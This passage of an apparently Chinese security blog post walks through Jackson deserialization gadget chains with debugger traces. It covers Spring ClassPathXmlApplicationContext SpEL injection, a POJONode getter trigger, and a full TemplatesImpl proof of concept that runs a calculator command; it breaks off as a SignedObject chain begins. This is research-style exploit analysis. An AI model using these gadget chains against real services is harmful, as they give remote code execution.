<span class="tag">&lt;<span class="name">property</span> <span class="attr">name</span>=<span class="string">&quot;whatever&quot;</span> <span class="attr">value</span>=<span class="string">&quot;#&#123; pb.start() &#125;&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="调试分析-3">调试分析</h4><p>先断到开始反序列化的这一步</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735028927220-957cd78d-5cf2-470d-a22c-3043c19e8d49.png" alt=""></p><p>跟进这次会走到TypeWrappedDeserializer.class的deserialize方法里去而不是之前的BeanDeserializer类的deserialize方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735028890730-186d84ba-4695-4be5-868c-319667c242c7.png" alt=""></p><p>那我们继续跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029164036-fc4dc1e5-8eaa-426d-b233-4fa586cd0123.png" alt=""></p><p>会走到这个case里去继续跟进去<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029311314-333edf39-0165-4a8c-aab6-caa3c1dce591.png" alt=""></p><p>继续调用</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029458294-b5bf3db9-e0af-46cb-bb8c-9205091bc56f.png" alt=""></p><p>这里会获取bean的反序列化器调用他的反序列化方法跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029499147-afd452de-a149-479c-8d1e-665b1421d42c.png" alt=""></p><p>继续走</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029516508-c7dc5114-9f2a-4514-91f6-c041e2a1fe64.png" alt=""></p><p>会进入这个case跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029542681-f7c9a017-fb9f-4dbe-835f-e2d29e3d1247.png" alt=""></p><p>看看这个createFromString方法是干嘛的</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029612228-c1fee04d-dc6b-41f8-b63b-b1051685deb0.png" alt=""></p><p>这里会去请求我们在web上的恶意xml文件</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029642767-014420c0-5baa-4a33-83a1-68dbb7ba199c.png" alt=""></p><p>跟进来发现会实例化一个对象继续跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029747487-953bfa49-9bf7-4fcd-a89f-c6516e750f78.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029764403-8fee56ee-a6bf-44ff-b4b4-8417e3e9d2e5.png" alt=""></p><p>这里会调用refresh方法</p><p>:::tips<br>前面调用newInstance()是新建我们的利用类org.springframework.context.support.ClassPathXmlApplicationContext的实例，但是我们看到并没有调用ClassPathXmlApplicationContext类相关的setter方法，这是因为该类本身就没有setter方法，但是拥有构造函数，因此Jackson反序列化的时候会自动调用ClassPathXmlApplicationContext类的构造函数。而这个点就是和之前的利用链的不同之处，该类的漏洞点出在自己的构造函数而非在setter方法中。</p><p>:::</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735029929360-6a3d75a9-6b3f-4ab0-b5bf-f7bb08352fd5.png" alt=""></p><p>关键点会调用invokeBeanFactoryPostProcessors方法跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735030129561-d19c5699-38ba-415d-93c6-d4c8d83ed89b.png" alt=""></p><p>继续跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735030163809-7cb8b33e-95a7-4813-a918-350d91c38fed.png" alt=""></p><p>会调用getBeanNamesForType方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735030229101-d584f5ac-45c4-4821-b8b2-d151bc4ab718.png" alt=""></p><p>会返回doGetBeanNamesForType方法的值</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735030363424-36387c5c-0a82-4b4a-80de-4eafbe76c33d.png" alt=""></p><p>跟进isFactoryBean方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735031282033-07d2df2c-cd93-4c9a-a647-102f28e9108f.png" alt=""></p><p>继续跟到predictBeanType里</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735031328546-c17f6515-4775-4017-a404-02f5164ea5dc.png" alt=""></p><p>继续到determineTarget里</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735031377193-af573c1b-cc27-44d4-bf53-86957cd2363e.png" alt=""></p><p>这里targetType是null所以会进入resolveClass方法跟进去</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735031439221-1dd5eef9-7239-485a-8f29-dcd786fc6b5e.png" alt=""></p><p>跟到doResolveBeanClass方法里</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735031479350-8de4b305-c652-4cd7-90e0-44744707bb1c.png" alt=""></p><p>跟进evaluateBeanDefinitionString方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735031526775-7c540edf-e1ab-4685-8478-4bf91e91c71f.png" alt=""></p><p>跟到beanExpressionResolver.evaluate</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735031731355-50251697-d710-4429-b58d-c1bdd8b28b8d.png" alt="">这里会获processBuilder对象继续向下走</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735031786214-3f981ef5-6f07-400e-a167-d74b0c1c17d2.png" alt=""></p><p>调用了Expression.getValue()方法即SpEL表达式执行的方法 sec参数是我们可以控制的内容即由spel.xml解析得到的SpEL表达式</p><p>org.springframework.context.support.ClassPathXmlApplicationContext类，它的构造函数存在SpEL注入漏洞，进而导致可被利用来触发Jackson反序列化漏洞。</p><h3 id="通用链">通用链</h3><h4 id="条件">条件</h4><p>利用的是Jackson中的PojoNode 他的toString是可以直接触发任意的getter的 触发条件如下</p><ul><li>不需要存在该属性</li><li>getter方法需要有返回值</li><li>尽可能的只有一个getter</li></ul><p>写一个demo测试一下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-databind<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-core<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.fasterxml.jackson.core<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>jackson-annotations<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.13.3<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> <span class="keyword">implements</span> <span class="title class_">Serializable</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">getName</span><span class="params">()</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        Runtime.getRuntime().exec(<span class="string">&quot;open -a Calculator&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;1&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setname&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;2&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jackson_tongsha</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(user);</span><br><span class="line">        jsonNodes.toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行就会弹出计算器。下面来分析一下为什么</p><h4 id="调试分析-4">调试分析</h4><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043243159-2a8f68cb-f15e-4146-9123-34f4587c4a8c.png" alt=""></p><p>跟到toString方法里会调用InternalNodeMapper.nodeToString继续跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043304314-86e2b935-92d3-4b88-a212-e60489f5606e.png" alt=""></p><p>跟到writeValueAsString方法里</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043359476-02fb17aa-fd37-49e3-bbe6-0a7b7f2b9123.png" alt="">�继续跟到_writeValueAndClose方法中<img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043397712-80b52a32-680d-4573-82f9-594f5d2c58c1.png" alt=""></p><p>继续跟到serialize方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043431879-227abbb7-02fb-45a5-90dc-68b26f9a5d4d.png" alt=""></p><p>继续跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043478187-0467152d-cbde-478c-b3a4-b084b10032cc.png" alt=""></p><p>这里会获取对应的序列化器然后传入序列化方法跟进</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043516182-f81bdda2-7d0d-40f9-a259-c65760f39d23.png" alt=""></p><p>继续</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043529164-083ca697-c6ff-4f6b-adfa-8ed06e42415c.png" alt=""><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043544236-94219a5d-5ac5-41f8-b3e6-59713653f82e.png" alt=""></p><p>跟进defaultSerializeValue方法�</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043683815-b28b5a5b-389a-4c6f-a62b-693be1308a1a.png" alt=""></p><p>继续跟</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043770342-135b8137-4802-4834-a7ed-3bdf8a123cba.png" alt=""></p><p>这里writeStartObject会写入{ writeEndObject写入}之后中间是对Bean对象的属性值的一些构造</p><p>这里跟到serializeFields方法</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043852306-75526ba6-062b-46f0-8875-459f85c16f41.png" alt=""></p><p>主要是对Bean类中的所有属性值的写入跟到serializeAsField方法中</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043900669-a995e299-15a8-49ac-b43b-c631c3e6ff70.png" alt=""></p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735043908833-c921e05a-9bdb-4d88-b7a0-6b43247a7fd2.png" alt=""></p><p>这里会反射调用getter方法，其实和fastjson序列化调用getter方法差不多自己跟跟就行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">getName:<span class="number">10</span>, User (com.ocean)</span><br><span class="line">invoke0:-<span class="number">1</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">62</span>, NativeMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">43</span>, DelegatingMethodAccessorImpl (sun.reflect)</span><br><span class="line">invoke:<span class="number">497</span>, Method (java.lang.reflect)</span><br><span class="line">serializeAsField:<span class="number">689</span>, BeanPropertyWriter (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeFields:<span class="number">774</span>, BeanSerializerBase (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">178</span>, BeanSerializer (com.fasterxml.jackson.databind.ser)</span><br><span class="line">defaultSerializeValue:<span class="number">1142</span>, SerializerProvider (com.fasterxml.jackson.databind)</span><br><span class="line">serialize:<span class="number">115</span>, POJONode (com.fasterxml.jackson.databind.node)</span><br><span class="line">serialize:<span class="number">39</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">serialize:<span class="number">20</span>, SerializableSerializer (com.fasterxml.jackson.databind.ser.std)</span><br><span class="line">_serialize:<span class="number">480</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serializeValue:<span class="number">319</span>, DefaultSerializerProvider (com.fasterxml.jackson.databind.ser)</span><br><span class="line">serialize:<span class="number">1518</span>, ObjectWriter$Prefetch (com.fasterxml.jackson.databind)</span><br><span class="line">_writeValueAndClose:<span class="number">1219</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">writeValueAsString:<span class="number">1086</span>, ObjectWriter (com.fasterxml.jackson.databind)</span><br><span class="line">nodeToString:<span class="number">30</span>, InternalNodeMapper (com.fasterxml.jackson.databind.node)</span><br><span class="line">toString:<span class="number">136</span>, BaseJsonNode (com.fasterxml.jackson.databind.node)</span><br><span class="line">main:<span class="number">12</span>, jackson_tongsha (com.ocean)</span><br></pre></td></tr></table></figure><p>9### templates链利用<br>直接给poc</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ocean;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> javax.xml.transform.Templates;</span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">jackson_tongsha</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">ctClass</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        ctClass.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;,ctClass);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -a Calculator\&quot;);&quot;</span>);</span><br><span class="line">        ctClass.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[] bytes = ctClass.toBytecode();</span><br><span class="line">        <span class="type">Templates</span> <span class="variable">templatesImpl</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">TemplatesImpl</span>();</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_bytecodes&quot;</span>, <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;bytes&#125;);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;fakes0u1&quot;</span>);</span><br><span class="line">        setFieldValue(templatesImpl, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        <span class="type">POJONode</span> <span class="variable">jsonNodes</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">POJONode</span>(templatesImpl);</span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">exp</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">val</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;javax.management.BadAttributeValueExpException&quot;</span>).getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        val.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        val.set(exp,jsonNodes);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(exp);</span><br><span class="line">        FileOutputStream fout=<span class="keyword">new</span> <span class="title class_">FileOutputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        fout.write(barr.toByteArray());</span><br><span class="line">        fout.close();</span><br><span class="line">        <span class="type">FileInputStream</span> <span class="variable">fileInputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">FileInputStream</span>(<span class="string">&quot;1.ser&quot;</span>);</span><br><span class="line">        System.out.println(serial(exp));</span><br><span class="line">        deserial(serial(exp));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> String <span class="title function_">serial</span><span class="params">(Object o)</span> <span class="keyword">throws</span> IOException, NoSuchFieldException &#123;</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">baos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">oos</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(baos);</span><br><span class="line">        oos.writeObject(o);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="type">String</span> <span class="variable">base64String</span> <span class="operator">=</span> Base64.getEncoder().encodeToString(baos.toByteArray());</span><br><span class="line">        <span class="keyword">return</span> base64String;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">deserial</span><span class="params">(String data)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">byte</span>[] base64decodedBytes = Base64.getDecoder().decode(data);</span><br><span class="line">        <span class="type">ByteArrayInputStream</span> <span class="variable">bais</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(base64decodedBytes);</span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(bais);</span><br><span class="line">        ois.readObject();</span><br><span class="line">        ois.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">Base64Encode</span><span class="params">(ByteArrayOutputStream bs)</span>&#123;</span><br><span class="line">        <span class="type">byte</span>[] encode = Base64.getEncoder().encode(bs.toByteArray());</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">String</span>(encode);</span><br><span class="line">        System.out.println(s);</span><br><span class="line">        System.out.println(s.length());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setFieldValue</span><span class="params">(Object obj, String field, Object arg)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> obj.getClass().getDeclaredField(field);</span><br><span class="line">        f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        f.set(obj, arg);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>但是这里运行会报错因为什么呢</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735045080749-c31cb363-84a2-4270-916e-6ad2d1792a97.png" alt=""></p><p>如果序列化的类实现了<code>writeReplace</code>方法，将会在序列化过程中调用它进行检查，好巧不巧，在<code>POJONode</code>的父类<code>BaseJsonNode</code>中就实现了这个方法，在这个方法的调用过程中抛出了异常，使得序列化过程中断</p><p>我们可以通过删除这个方法来跳过这个过程，进而成功的序列化。所以我们重写他的父类删掉就可以了</p><p><img src="https://image.baidu.com/search/down?url=https://cdn.nlark.com/yuque/0/2024/png/25729212/1735045171946-b0b7b646-0ebc-4b0b-b10e-a9d423f19bed.png" alt=""></p><p>这样就可以正常触发了</p><h3 id="SignObject链">SignObject链</h3><p>在Templates被ban的情况下 打二次反序列化</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span 